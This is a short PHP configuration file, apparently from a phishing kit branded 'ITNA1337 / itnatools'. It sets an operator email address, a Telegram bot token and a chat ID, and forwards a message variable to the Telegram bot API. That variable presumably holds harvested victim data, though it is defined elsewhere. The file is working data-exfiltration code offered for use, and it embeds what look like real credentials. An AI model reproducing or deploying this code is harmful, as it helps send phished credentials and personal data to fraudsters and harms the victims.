<?php
////////////////////////////////////////////////////////
//  ___  _____  _   _     _     _  _____ _____ _____  // 
// |_ _||_   _|| \ | |   / \   / ||___ /|___ /|___  | // 
//  | |   | |  |  \| |  / _ \  | |  |_ \  |_ \   / /  // 
//  | |   | |  | |\  | / ___ \ | | ___) |___) | / /   //
// |___|  |_|  |_| \_|/_/   \_\|_||____/|____/ /_/    //
//                                                    //
//    Telegram : @ITNA1337 | Channel @itnatools       //
////////////////////////////////////////////////////////                                                   

// YOUR EMAIL HERE BRO
$send = "watsonhire010@outlook.com";

// YOUR Telegram Bot
$token = "5341211597:AAFz1KbXY0EeGZ7zwRy6imM67BlbFitILUg";
$data = [
'text' => $message,

// YOUR CHAT ID
'chat_id' => '1572176937'


];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
?>